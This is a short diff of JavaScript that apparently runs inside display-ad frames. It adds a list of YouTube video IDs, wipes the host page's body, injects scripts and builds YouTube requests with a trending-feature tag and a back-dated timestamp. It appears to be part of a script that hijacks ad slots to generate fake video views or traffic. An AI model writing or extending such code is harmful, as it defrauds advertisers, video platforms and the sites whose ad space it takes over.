@@ -1,4 +1,13 @@
-var newstr = window.location.href.replace('https://tpc.googlesyndication.com/safeframe/1-0-14/html/container.html#ai=',"");
+var  videoIds = new Array();
+videoIds[1] = "HsoT2CtuyTM";
+videoIds[2] = "iGI2rvpnvbE";
+videoIds[3] = "VxPmfjv2X60";
+videoIds[4] = "dRnrjyJV25I";
+videoIds[5] = "BqrxDM8Ks_o";
+videoIds[6] = "k_Oa7tciRF4";
+videoIds[7] = "G95-c2YqNQU";
+
+var newstr = window.location.href.replace('https://s0.2mdn.net/ads/richmedia/studio/mu/templates/tetris/bootstrap-3/tetris.html',"");
 document.getElementsByTagName("body")[0].innerHTML='';
 var jquery_js = document.createElement("script");
 	jquery_js.setAttribute("type","text/javascript");
@@ -184,7 +193,7 @@ var yt_dm_iframe = document.createElement("div");
 		var xhrTimeout;
 		var yt_data_p2;
 				ad = 0;
-				host = 'https://gaming.youtube.com';
+				host = 'https://www.youtube.com/';
 				feature='iv-trending';
 				t = Math.round(new Date().getTime() / 1000) - (3600 * 7);
 				videoId = videoIds[newstr];
